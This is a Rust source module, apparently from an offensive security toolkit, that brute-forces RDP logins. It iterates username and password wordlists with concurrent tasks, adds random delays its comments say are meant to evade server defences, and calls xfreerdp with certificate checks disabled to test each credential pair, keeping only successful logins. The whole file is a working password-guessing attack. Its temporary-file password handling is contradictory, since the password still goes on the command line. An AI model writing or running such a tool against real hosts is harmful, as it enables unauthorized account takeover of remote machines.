use crate::handler::brute::{BruteForceResult, BruteForceTask, Protocol, TaskStatus, BruteForceManager};
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use std::time::{Duration, Instant};
use futures::future::join_all;
use rand::Rng;
use std::process::Command;
use std::io::Write;
use tempfile::NamedTempFile;

// RDP暴力破解功能
pub async fn rdp_brute_force(
    task: BruteForceTask,
    manager_state: Arc<Mutex<BruteForceManager>>
) -> Vec<BruteForceResult> {
    let target = task.target.clone();
    let port = if task.port == 0 { 3389 } else { task.port }; // 默认RDP端口3389
    let task_id = task.id.unwrap_or(0);
    let num_threads = task.threads.max(1) as usize;
    
    // 获取用户名和密码列表
    let usernames = match (task.usernames.clone(), task.username_file.clone()) {
        (Some(names), _) if !names.is_empty() => names,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["administrator".to_string(), "admin".to_string()],
    };

    let passwords = match (task.passwords.clone(), task.password_file.clone()) {
        (Some(pwds), _) if !pwds.is_empty() => pwds,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["".to_string(), "password".to_string(), "123456".to_string()],
    };

    if usernames.is_empty() || passwords.is_empty() {
        return Vec::new();
    }

    let semaphore = Arc::new(Semaphore::new(num_threads));
    let mut spawned_tasks = Vec::new();

    'outer: for username in usernames {
        for password in &passwords {
            // 检查任务是否已从外部停止
            {
                let guard = manager_state.lock().await;
                if let Some(current_task_in_manager) = guard.tasks.iter().find(|t| t.id == Some(task_id)) {
                    if current_task_in_manager.status == TaskStatus::Stopped {
                        break 'outer;
                    }
                } else {
                    break 'outer;
                }
            }

            let permit = match semaphore.clone().acquire_owned().await {
                Ok(p) => p,
                Err(_) => break 'outer,
            };

            let t_target = target.clone();
            let t_port = port;
            let t_username = username.clone();
            let t_password = password.clone();
            let t_timeout_secs = task.timeout;
            let t_task_id = task_id;
            let t_protocol_clone = task.protocol.clone();
            
            // 增加随机延迟以避免触发服务器防御机制
            let delay_ms = rand::thread_rng().gen_range(10..100);
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;

            spawned_tasks.push(tokio::spawn(async move {
                let start_time = Instant::now();
                
                // 为 try_rdp_login 克隆 String 参数，以便原始值可以用于 BruteForceResult
                let result = try_rdp_login(t_target.clone(), t_port, t_username.clone(), t_password.clone(), t_timeout_secs).await;
                let duration = start_time.elapsed().as_millis() as u64;
                drop(permit);
                
                match result {
                    Ok(_) => {
                        // 登录成功
                        Some(BruteForceResult {
                            task_id: t_task_id,
                            target: t_target, // 现在 t_target 仍然可用
                            protocol: t_protocol_clone,
                            username: t_username, // 现在 t_username 仍然可用
                            password: t_password, // 现在 t_password 仍然可用
                            success: true,
                            time_taken: duration,
                            error: None,
                        })
                    },
                    Err(_) => None, // 不返回失败结果
                }
            }));
        }
    }

    let mut results = Vec::new();
    for task_handle in join_all(spawned_tasks).await {
        match task_handle {
            Ok(Some(result)) => {
                results.push(result);
            }
            Ok(None) => {
                // 登录尝试失败，不做任何操作
            }
            Err(e) => {
                eprintln!("RDP brute force task panicked: {}", e);
            }
        }
    }

    results
}

// 尝试RDP登录
async fn try_rdp_login(host: String, port: u16, username: String, password: String, timeout: u64) -> Result<(), String> {
    // 使用spawn_blocking执行外部命令，因为它会阻塞线程
    tokio::task::spawn_blocking(move || {
        // 这里我们假设使用freerdp工具进行连接测试
        // 在生产环境中，应该选择适合的RDP客户端库或工具
        
        // 创建临时密码文件以避免命令行中的密码泄露
        let mut password_file = NamedTempFile::new()
            .map_err(|e| format!("Failed to create temporary password file: {}", e))?;
            
        password_file.write_all(password.as_bytes())
            .map_err(|e| format!("Failed to write password to file: {}", e))?;
            
        let password_path = password_file.path().to_string_lossy().to_string();
        
        // 构建RDP连接命令，使用超时参数
        let status = Command::new("xfreerdp")
            .arg("/cert:ignore") // 忽略证书验证
            .arg(format!("/v:{host}:{port}"))
            .arg(format!("/u:{username}"))
            .arg(format!("/p:{password}"))
            .arg("/d:.")  // 默认域
            .arg("+auth-only") // 仅验证，不打开窗口
            .arg("/nowallpaper") // 不加载壁纸以加快速度
            .arg(format!("/timeout:{}", timeout * 1000)) // 超时（毫秒）
            .arg("/silent:true") // 静默模式，不显示错误弹窗
            .status()
            .map_err(|e| format!("Failed to execute RDP command: {}", e))?;
            
        if status.success() {
            Ok(())
        } else {
            Err(format!("RDP authentication failed with exit code: {}", status))
        }
    }).await.unwrap_or_else(|e| Err(format!("RDP task panic: {}", e)))
} 